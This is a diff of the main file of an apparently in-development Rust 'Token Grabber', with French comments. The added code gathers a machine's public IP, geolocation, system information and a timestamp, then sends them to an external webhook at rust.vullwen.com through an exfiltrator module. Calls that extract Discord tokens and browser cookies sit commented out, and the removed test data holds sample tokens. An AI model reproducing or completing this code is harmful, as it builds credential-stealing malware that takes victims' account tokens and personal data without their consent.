@@ -1,95 +1,88 @@
-mod injector;
-mod extractor;
 mod exfiltrator;
+mod extractor;
+mod injector;
 mod obfuscation;
 mod utils;
 
-use injector::Injector;
-use extractor::Extractor;
 use exfiltrator::Exfiltrator;
-use serde_json;
-
-
-const TEST_DATA: &str = r#"
-[
-  {
-    "ip": "90.84.75.123",
-    "location": "Lyon, France",
-    "tokens": [
-      "mfa.A1b2C3d4E5f6G7h8I9j0k.LMnOpQrStUvWxYz123456",
-      "NzI1MzYwNDg4NzEyMzQ1Njc4.Xyz789.ABCdefGHIjklMNopQRst"
-    ],
-    "system_info": {
-      "os": "Windows 10 Pro 64-bit",
-      "cpu": "Intel Core i5-10400F @ 2.90GHz",
-      "ram": 16
-    },
-    "timestamp": 1744815001
-  },
-  {
-    "ip": "51.178.32.45",
-    "location": "Marseille, France",
-    "tokens": [
-      "mfa.Z9Y8X7W6V5U4T3S2R1Q0.ZxYwVuTsRqPoNmLkJiHg",
-      "OTIxMjM0NTY3ODkwMTIz.NbVcXz.MjKlHgFdSaQwErTyUiOp"
-    ],
-    "system_info": {
-      "os": "macOS Ventura 13.4",
-      "cpu": "Apple M1",
-      "ram": 8
-    },
-    "timestamp": 1744814900
-  },
-  {
-    "ip": "192.168.0.42",
-    "location": "Local Network",
-    "tokens": [
-      "token_fake_local_1",
-      "token_fake_local_2"
-    ],
-    "system_info": {
-      "os": "Ubuntu 22.04 LTS",
-      "cpu": "AMD Ryzen 5 5600X",
-      "ram": 32
-    },
-    "timestamp": 1744814800
-  }
-]
-"#;
-
+use extractor::Extractor;
+use injector::Injector;
+use serde_json::json;
+use utils::{get_geolocation, get_public_ip, get_system_info, get_timestamp};
 
 #[tokio::main]
 async fn main() {
     println!("Token Grabber en Rust");
 
-    let (_injector, _extractor, exfiltrator) = initialize_components();
+    println!("Test ip:");
+    let ip = match get_public_ip().await {
+        Ok(Some(ip_str)) => {
+            println!("IP publique : {}", ip_str);
+            ip_str
+        }
+        Ok(None) => {
+            eprintln!("Impossible de récupérer l'IP publique");
+            return;
+        }
+        Err(e) => {
+            eprintln!("Erreur lors de la récupération de l'IP : {}", e);
+            return;
+        }
+    };
+    println!("Géolocalisation de l’IP :");
+    if let Some((city, country)) = get_geolocation(&ip).await {
+        println!("IP {} → {}, {}", ip, city, country);
+    } else {
+        eprintln!("Impossible de géolocaliser l’IP {}", ip);
+    }
 
-    if let Err(err) = run_token_grabber(&exfiltrator).await {
+    //Init
+    let injector = Injector::new();
+    let extractor = Extractor::new();
+    let webhook_url = "https://rust.vullwen.com/webhook.php";
+    let exfiltrator = Exfiltrator::new(webhook_url);
+
+    let mut entries = Vec::new();
+
+    //let tokens = extractor.extract_discord_tokens();
+    //let browser_cookies = extractor.extract_browser_data();
+    let sys_info = get_system_info();
+    let ts = get_timestamp();
+    let location = match get_geolocation(&ip).await {
+        Some((city, country)) => format!("{}, {}", city, country),
+        None => String::from("Unknown"),
+    };
+
+    // Préparation de la structure serialisable
+    let data = json!({
+        "ip": ip,
+        "location": location,
+        "tokens": ["qwerty"],//tokens,
+        "system_info": sys_info,
+        "timestamp": ts,
+        //"browser_cookies": browser_cookies,
+    });
+    entries.push(data);
+
+    // 5. Envoi
+    if let Err(err) = run_token_grabber(&exfiltrator, entries).await {
         eprintln!("Erreur lors de l’exécution : {}", err);
     } else {
         println!("Tous les envois ont réussi");
     }
 }
 
-fn initialize_components() -> (Injector, Extractor, Exfiltrator) {
-    let webhook_url = "https://rust.vullwen.com/webhook.php";
+async fn run_token_grabber(
+    exfiltrator: &Exfiltrator,
+    entries: Vec<serde_json::Value>,
+) -> Result<(), String> {
+    for entry in entries.into_iter() {
+        println!("Traitement de l’entrée au timestamp {}", entry["timestamp"]);
 
-    let injector = Injector::new();
-    let extractor = Extractor::new();
-    let exfiltrator = Exfiltrator::new(webhook_url);
+        let data_struct: extractor::ExtractedData = serde_json::from_value(entry.clone())
+            .map_err(|e| format!("Conversion JSON en ExtractedData : {}", e))?;
 
-    (injector, extractor, exfiltrator)
-}
-
-
-async fn run_token_grabber(exfiltrator: &Exfiltrator) -> Result<(), String> {
-    let entries: Vec<crate::extractor::ExtractedData> =
-        serde_json::from_str(TEST_DATA).map_err(|e| e.to_string())?;
-
-    for entry in entries.iter() {
-        println!("Traitement de l’entrée au timestamp {}", "PAS ENCORE DEV");
-        exfiltrator.send_data(entry).await?;
+        exfiltrator.send_data(&data_struct).await?;
     }
     Ok(())
 }
-
